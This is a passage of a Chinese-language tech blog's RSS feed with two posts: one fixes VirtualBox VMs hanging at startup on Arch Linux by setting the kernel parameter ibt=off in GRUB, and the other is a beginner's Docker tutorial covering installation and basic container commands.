<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>Linux - 标签 - WeepingDogel</title>
        <link>http://weepingdogel.github.io/tags/linux/</link>
        <description>Linux - 标签 - WeepingDogel</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Mon, 06 Mar 2023 22:27:08 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/linux/" rel="self" type="application/rss+xml" /><item>
    <title>尝试解决最近 VirtualBox 启动虚拟机时卡在 Starting 的问题</title>
    <link>http://weepingdogel.github.io/posts/problem_of_virtualbox_appeding_starting_vm/</link>
    <pubDate>Mon, 06 Mar 2023 22:27:08 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/problem_of_virtualbox_appeding_starting_vm/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/photo_2023-03-06_20-52-14.jpg" referrerpolicy="no-referrer">
            </div><h1 id="序遇到了啥问题啊">序：遇到了啥问题啊？</h1>
<p>今天心血来潮想要玩一下 VirtualBox 虚拟机， 结果发现打开之后每个虚拟机都卡在 <code>Starting virutal machine.</code>。</p>
<p>首先遇到问题的第一步就是去谷歌。</p>
<p>嗯&hellip; 查到了两篇 Arch 官方论坛的帖子。</p>
<ul>
<li>
<p><a href="https://bbs.archlinux.org/viewtopic.php?id=277409" target="_blank" rel="noopener noreffer">Virtualbox hangs on Starting virtual machine window / Newbie Corner / Arch Linux Forums</a></p>
</li>
<li>
<p><a href="https://bbs.archlinux.org/viewtopic.php?id=276699" target="_blank" rel="noopener noreffer">KVM busted in linux 5.18 due to Intel CET / Kernel &amp; Hardware / Arch Linux Forums</a></p>
</li>
</ul>
<p>读完两篇帖子之后，我发现是因为 KVM 在新版本的内核中产生了一个 bug 导致的。</p>
<p>已经有大佬提交了 Bug 报告了。</p>
<ul>
<li>
<p><a href="https://bugs.archlinux.org/task/75481" target="_blank" rel="noopener noreffer">FS#75481 : [linux] VBox virtual machines stop functioning</a></p>
</li>
<li>
<p><a href="https://github.com/torvalds/linux/commit/991625f3dd2cbc4b787deb0213e2bcf8fa264b21" target="_blank" rel="noopener noreffer">x86/ibt: Add IBT feature, MSR and #CP handling · torvalds/linux@991625f · GitHub</a></p>
</li>
</ul>
<p><del>至于这个 Bug 是怎么产生&hellip; 咱笨笨，不知道</del></p>
<h1 id="想想怎么解决">想想怎么解决</h1>
<p>根据阅读帖子里的内容，得到的解决方法都是设置内核参数 <code>ibt=off</code>。</p>
<blockquote>
<p>Thank you</p>
<p>appending</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ibt=off
</span></span></code></pre></td></tr></table>
</div>
</div><p>to kernel boot params fixed my problem.</p>
</blockquote>
<h2 id="怎么设置内核启动参数呢">怎么设置内核启动参数呢？</h2>
<p>我并不知道这个，所以我还是去谷歌查了，得到了方法。</p>
<ul>
<li><a href="https://linuxconfig.org/how-to-set-kernel-boot-parameters-on-linux" target="_blank" rel="noopener noreffer">How to set kernel boot parameters on Linux - Linux Tutorials - Learn Linux Configuration</a></li>
</ul>
<p>此时能看懂英文的读者可以参考上面这条链接去解决问题了，但是如果英文阅读比较困难的话，也可以跟着本文的步骤走。</p>
<h2 id="设想的解决方法">设想的解决方法</h2>
<p>其实就是编辑 <code>/etc/defualt/grub</code> 这个文件的 <code>GRUB_CMDLINE_LINUX=&quot;&quot;</code> 的值。</p>
<p>然后往这里面写 <code>&quot;ibt=off&quot;</code></p>
<h1 id="解决步骤">解决步骤</h1>
<h2 id="1-编辑-etcdefaultgrub-文件">1. 编辑 <code>/etc/default/grub</code> 文件</h2>
<p>编辑这个文件的目的是设置内核启动参数，在不同的启动引导器引导的系统中，设置这个玩意的方法也有所不同，由于我的 Arch 用的是 Grub， 所以我需要编辑这个文件。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo vim /etc/default/grub
</span></span></code></pre></td></tr></table>
</div>
</div><p>找到 <code>GRUB_CMDLINE_LINUX=&quot;&quot;</code> 关键字，并设置参数 <code>ibt=off</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># GRUB boot loader configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GRUB_DEFAULT=0
</span></span><span class="line"><span class="cl">GRUB_TIMEOUT=5
</span></span><span class="line"><span class="cl">GRUB_DISTRIBUTOR=&#34;Arch&#34;
</span></span><span class="line"><span class="cl">GRUB_CMDLINE_LINUX_DEFAULT=&#34;loglevel=7&#34;
</span></span><span class="line"><span class="cl">GRUB_CMDLINE_LINUX=&#34;ibt=off&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">......
</span></span></code></pre></td></tr></table>
</div>
</div><p>按 <code>:</code> 输入 <code>wq</code> 回车（基础操作了，不多解释）。</p>
<h2 id="2-重新生成-grub-配置文件">2. 重新生成 Grub 配置文件</h2>
<p>然后重新生成 Grub 配置文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></td></tr></table>
</div>
</div><p>等待操作，在没有报错的情况下，可以重启操作系统了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo reboot
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="测试和验证">测试和验证</h1>
<p>重启之后再次打开 VirutalBox， 然后启动一个虚拟机，此时发现虚拟机已经进入了系统。</p>
<p></p>
<p>这意味着问题得到了解决。</p>
]]></description>
</item><item>
    <title>浅尝 Docker</title>
    <link>http://weepingdogel.github.io/posts/%E6%B5%85%E5%B0%9Ddocker/</link>
    <pubDate>Sat, 15 Oct 2022 20:21:13 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E6%B5%85%E5%B0%9Ddocker/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="https://w.wallhaven.cc/full/d5/wallhaven-d5we7o.png" referrerpolicy="no-referrer">
            </div><h1 id="序">序</h1>
<p>嗯，未雨绸缪，提前学一下怎么玩 docker 。</p>
<p><del>卷死他们</del></p>
<h1 id="docker-是什么">docker 是什么？</h1>
<p><div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>官方英文简介<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly. With Docker, you can manage your infrastructure in the same ways you manage your applications. By taking advantage of Docker’s methodologies for shipping, testing, and deploying code quickly, you can significantly reduce the delay between writing code and running it in production.</div>
        </div>
    </div>
根据官方文档的说明和通俗的理解， docker 能够提供快速部署软件项目的容器，它相当于一个可以模拟项目所需环境的虚拟机，但又和我们理解的一般的虚拟机又不同。</p>
<p>一般的虚拟机需要安装整个操作系统，会对我们的计算机占用大量的资源，而 docker 只需要模拟出项目所需要的运行环境，占用率非常低，这可以大大提高开发效率。</p>
<p>它可以按照我们的需求模拟出软件环境，并且能够快速部署我们开发好的项目实例（比如 Mastodon），并且一定程度上它具有环境隔离功能，运行环境与操作系统相分离，而且可以同时运行多个容器。</p>
<p>并且我们可以把容器封装成镜像，进行反复利用。</p>
<p>就像这条运着集装箱的鲸鱼一样，游到哪都是开箱即用。</p>
<p></p>
<h1 id="怎么安装-docker">怎么安装 docker</h1>
<p>各个平台装 docker 都非常简单。</p>
<p>Linux 平台可能对初学者稍微难一些，但是对熟悉的用户来说， Linux 安装 docker 非常快。</p>
<p>直接从相应发行版的包管理器安装就行。</p>
<h2 id="arch">Arch</h2>
<p>比如咱 Arch 可以让 pacman 把这条鲸鱼给带回来。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo pacman -S docker
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw"></i>注意<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>如果运行时出现以下报错</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?.
</span></span><span class="line"><span class="cl">See &#39;docker run --help&#39;.
</span></span></code></pre></td></tr></table>
</div>
</div><p>请使用 <code>systemctl</code> 启动 <code>docker</code> 的系统进程。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo systemctl start docker
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果有必要，设置其开机自启</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo systemctl enable docker
</span></span></code></pre></td></tr></table>
</div>
</div></div>
        </div>
    </div>
<h2 id="debian">Debian</h2>
<p>如果是用 deb 系的发行版，可以参考<a href="https://docs.docker.com/engine/install/debian/#install-docker-engine" target="_blank" rel="noopener noreffer">官方文档</a>用 apt 来安装。</p>
<h3 id="设置仓库">设置仓库</h3>
<ol>
<li>更新 apt 仓库，并安装一些依赖来允许 apt 通过 https 使用第三方仓库。</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt update
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt install ca-certificates curl gnupg lsb-release
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>添加 Docker 官方 GPG 密钥</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo mkdir -p /etc/apt/keyrings
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>设置 Docker 仓库</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="s2">&#34;deb [arch=</span><span class="k">$(</span>dpkg --print-architecture<span class="k">)</span><span class="s2"> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \
</span></span></span><span class="line"><span class="cl"><span class="s2">  </span><span class="k">$(</span>lsb_release -cs<span class="k">)</span><span class="s2"> stable&#34;</span> <span class="p">|</span> sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装-docker">安装 docker</h3>
<ol>
<li>更新软件包仓库</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt update
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果更新的时候发生了 GPG 错误，可以参考官网的<a href="https://docs.docker.com/engine/install/debian/#install-docker-engine" target="_blank" rel="noopener noreffer">这个提示</a>：</p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>Receiving a GPG error when running apt-get update?<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Your default <a href="https://en.wikipedia.org/wiki/Umask" target="_blank" rel="noopener noreffer">umask</a> may be incorrectly configured, preventing detection of the repository public key file. Try granting read permission for the Docker public key file before updating the package index:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> $ sudo chmod a+r /etc/apt/keyrings/docker.gpg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> $ sudo apt-get update
</span></span></code></pre></td></tr></table>
</div>
</div></div>
        </div>
    </div>
<ol start="2">
<li>安装 Docker Engine 、 containerd 和 Docker Compose.</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>通过运行 hello-world 镜像来验证 docker 是否安装成功</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker run hello-world
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="rpm-系列">rpm 系列</h2>
<p>其实说实话，这类发行版我个人不太喜欢，就拿 CentOS 为例吧，CentOS 7 以上的版本也是可以直接用 yum 安装的。</p>
<h3 id="设置仓库-1">设置仓库</h3>
<p>一样是设置第三方仓库。</p>
<p>不过要先安装 <code>yum-utils</code> 才能用 <code>yum-config-manager</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo yum install -y yum-utils
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后设置仓库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo yum-config-manager \
</span></span><span class="line"><span class="cl">    --add-repo \
</span></span><span class="line"><span class="cl">    https://download.docker.com/linux/centos/docker-ce.repo
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装">安装</h3>
<p>一样是使用 yum 命令来安装 docker 的软件包和依赖。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="对于-linux-平台再提一嘴">对于 Linux 平台再提一嘴</h2>
<p>上述的方法都是在 Linux 平台安装 docker 的最新版本，如果需要安装特定的版本，可以<a href="https://docs.docker.com/engine/" target="_blank" rel="noopener noreffer">参考 docker 的官方文档</a>进行操作。</p>
<h2 id="windows">Windows</h2>
<p>在 Windows 平台可以直接安装 docker-desktop，这也非常简单，直接通过 <a href="https://docs.docker.com/desktop/install/windows-install/" target="_blank" rel="noopener noreffer">docker 官方文档</a><a href="https://desktop.docker.com/win/main/amd64/Docker%20Desktop%20Installer.exe" target="_blank" rel="noopener noreffer">下载</a>安装包就行了。</p>
<h1 id="我能怎么玩-docker">我能怎么玩 docker？</h1>
<p>docker 能干的事多着呢。</p>
<p>最常用的就是在 docker 容器里运行应用程序了。</p>
<h2 id="helloworld">HelloWorld</h2>
<p>比如我们来运行一个 Hello World</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker run ubuntu /bin/echo &#34;hello world&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>如图所见，它输出一系列字符后，在最后输出了 hello world</p>
<p></p>
<p>那么来解释一下命令的含义吧</p>
<ul>
<li><code>docker</code> &ndash; 运行 docker 的二进制文件, 这个没什么好说的</li>
<li><code>run</code> &ndash; 运行容器</li>
<li><code>ubuntu</code> &ndash; 要运行的镜像名称</li>
<li><code>/bin/echo &quot;hello world&quot;</code> - 在容器里面要执行的命令</li>
</ul>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>提示<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>如果出现了以下信息，可能是因为在启动容器的时候没有下载好相关的镜像</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Unable to find image &#39;ubuntu:latest&#39; locally
</span></span><span class="line"><span class="cl">latest: Pulling from library/ubuntu
</span></span><span class="line"><span class="cl">e96e057aae67: Pull complete 
</span></span></code></pre></td></tr></table>
</div>
</div><p>默认情况下 docker 会自动下载，但最好养成启动之前下载好镜像的习惯。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker pull ubuntu
</span></span></code></pre></td></tr></table>
</div>
</div></div>
        </div>
    </div>
<h2 id="交互式容器">交互式容器</h2>
<p>当然,我们也可以创建一个可以交互的容器,意思就是可以用 bash 来控制它</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker run -i -t ubuntu /bin/bash
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>参数含义<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ul>
<li><code>-i</code>: 交互式操作。</li>
<li><code>-t</code>: 终端。</li>
</ul>
<p><a href="https://www.runoob.com/docker/docker-image-usage.html" target="_blank" rel="noopener noreffer">引自菜鸟教程</a></div>
        </div>
    </div>
<p>这样我们创建容器之后,我们的 shell 也变成了容器里的 shell</p>
<p></p>
<p>我们可以对它进行一些操作命令,随便打几个吧.</p>
<p></p>
<p>而且我们执行的命令是不会影响到主系统的</p>
<p>然后我们可以使用 <code>exit</code> 命令来退出这个系统.</p>
<p></p>
<p>这样一来容器的操作系统就退出了,同时容器也停止运行了, 因为这个容器不是以 daemon 模式来运行的.</p>
<h2 id="以-daemon-模式来运行容器">以 daemon 模式来运行容器</h2>
<p>接下来我要说的是,为啥上文中用 <code>exit</code> 退出容器 shell 之后还不算完.</p>
<p>这次我们再打开一个容器,不过这次加一个参数 <code>-d</code></p>
<p>这个参数的意思是以 Daemon 模式运行, 那么 Daemon 是什么意思呢?</p>
<p>通过搜索引擎得到的答案往往是什么 系统守护进程巴拉巴拉的,其实它类似于后台运行的意思.</p>
<p>接下来我们用这个命令来开个容器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker run -i -t -d ubuntu /bin/bash
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>这时我们发现,我们并没有得一个 shell, 而是得到来一串字符串.</p>
<p>我们试试用 docker 的 ps 命令来查看一下正在运行的容器:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker ps
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们得到来这样的结果</p>
<p></p>
<p>图片可能不太清楚? 这里还是贴出来吧</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[weepingdogel@WeepingDogel-Arch ~]$ sudo docker ps
</span></span><span class="line"><span class="cl">CONTAINER ID   IMAGE     COMMAND       CREATED              STATUS              PORTS     NAMES
</span></span><span class="line"><span class="cl">2f4976200305   ubuntu    &#34;/bin/bash&#34;   About a minute ago   Up About a minute             funny_pare
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后发现了返回的结果中容器 ID 只有上面返回字符串的前面一部分,这个往往是我们会用的容器 ID</p>
<p>要怎样才能控制它的 shell 呢?</p>
<p>又要接触新的 docker 命令了</p>
<ul>
<li>attach</li>
<li>exec</li>
</ul>
<p>exec 需要加上 <code>-i</code> 和 <code>-t</code> 参数以及命令,比如 <code>/bin/bash</code> .</p>
<p>所以执行格式是这样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker exec -it 容器ID 命令
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们需要执行 bash</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker exec -it 2f4976200305 /bin/bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>很快,我们就进入了容器的 shell.</p>
<p></p>
<p>我们可以用 <code>cat /etc/os-release</code> 来查看系统信息.</p>
<p></p>
<p>我们可以很清晰的看到,上面返回的是 Ubuntu 而我用的是 Arch, 因此我们可以确定容器里的东西不会影响到操作系统.</p>
<p>什么?不清晰?那再看清楚一点吧</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PRETTY_NAME=&#34;Ubuntu 22.04.1 LTS&#34;
</span></span><span class="line"><span class="cl">NAME=&#34;Ubuntu&#34;
</span></span><span class="line"><span class="cl">VERSION_ID=&#34;22.04&#34;
</span></span><span class="line"><span class="cl">VERSION=&#34;22.04.1 LTS (Jammy Jellyfish)&#34;
</span></span><span class="line"><span class="cl">VERSION_CODENAME=jammy
</span></span><span class="line"><span class="cl">ID=ubuntu
</span></span><span class="line"><span class="cl">ID_LIKE=debian
</span></span><span class="line"><span class="cl">HOME_URL=&#34;https://www.ubuntu.com/&#34;
</span></span><span class="line"><span class="cl">SUPPORT_URL=&#34;https://help.ubuntu.com/&#34;
</span></span><span class="line"><span class="cl">BUG_REPORT_URL=&#34;https://bugs.launchpad.net/ubuntu/&#34;
</span></span><span class="line"><span class="cl">PRIVACY_POLICY_URL=&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;
</span></span><span class="line"><span class="cl">UBUNTU_CODENAME=jammy
</span></span></code></pre></td></tr></table>
</div>
</div><p>退出还是一样的可以用 <code>exit</code> , 但是此时的 exit 只是退出这个 bash, 它并不会关闭容器.</p>
<p>执行 <code>docker ps</code> 我们可以看到它还在运行.</p>
<p></p>
<p>那么我们接下来试试 attach</p>
<p>它的用法是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker attach 容器ID
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以我需要执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker attach 2f4976200305
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>这样一来我们也可以得到一个shell,但是如果我们执行了 <code>exit</code>, 这个容器是会被停止的.</p>
<p>来试试看?</p>
<p>很明显,当 <code>exit</code> 被执行之后用 <code>docker ps</code> 命令看不到正在运行的容器ID,这说明容器被停止了.</p>
<p></p>
<p>如果需要再次启动这个容器呢,我们可以使用 start 或者 restart 命令来重启.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker restart 2f4976200305
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时我们用 <code>docker ps</code> 就又能看到它在运行了</p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>提示<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>使用 <code>docker ps -a</code>命令可以查看所有的容器,无论是否正在运行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
